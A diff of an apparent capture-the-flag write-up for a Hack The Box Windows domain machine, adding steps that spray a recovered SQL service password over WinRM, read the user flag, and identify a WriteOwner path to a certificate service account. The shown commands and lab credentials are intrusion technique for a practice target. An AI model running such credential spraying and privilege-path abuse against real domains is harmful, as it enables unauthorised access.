@@ -207,7 +207,11 @@ SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
 ```
 
 
-Spray the password again at the `users.txt` to find that `ryan` reused it.
+```bash
+echo 'WqSZAF6CysDQbGb3' >> creds.txt
+```
+
+Spray the passwords list again at the `users.txt` to find that `ryan` reused the `WqSZAF6CysDQbGb3` password, and its valid to login over winrm.
 ```bash
 nxc winrm 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success
 
@@ -216,6 +220,10 @@ WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6C
 ...
 ```
 
+User flag in ryans desktop
+```powershell
+*Evil-WinRM* PS C:\Users\ryan\Documents> more ../Desktop/user.txt
+```
 
 
 Upload SharpHound
@@ -244,9 +252,11 @@ nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\
 "C:\Users\Public\20250615120137_loot.zip" was downloaded to "loot.zip"
 ```
 
+After uploading and ingesting the data, I found that the `ryan` user has `WriteOwner` permissions over the `ca_svc` service account.
+![[Pasted image 20250615203243.png]]
 
-
-
+This account is a member of the "Cert Publishers" group, 
+![[Pasted image 20250615203401.png]]
 
 
 ## Enumeration
